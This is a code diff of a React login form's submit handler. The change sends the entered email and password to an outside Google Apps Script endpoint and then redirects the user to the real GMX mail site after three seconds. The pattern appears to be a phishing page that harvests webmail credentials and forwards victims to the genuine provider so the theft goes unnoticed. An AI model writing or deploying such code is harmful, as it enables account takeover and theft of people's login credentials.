@@ -46,20 +46,23 @@ export default function Main() {
 
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault()
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
 
-    const data = {
-      email: credentials.email,
-      password: credentials.passwort
+    const formData = new FormData()
+    formData.append('email', credentials.email)
+    formData.append('passwort', credentials.passwort)
+
+    fetch(scriptURL, { method: 'POST', body: formData})
+    .then(response => {
+        console.log(response)
+        setTimeout(() => {
+          window.location.replace('https://www.gmx.net')
+        }, 3000);
+       
     }
-
-    axios.post('/api/hello', data)
-    .then((req) => {
-      console.log(req.data);
-      setCredentials({passwort: "", email: ""})
-      window.location.href = 'https://www.gmx.net'
-    }).catch((err) => {
+    ).catch(err => {
       console.log(err);
-
+      
     })
   }
   
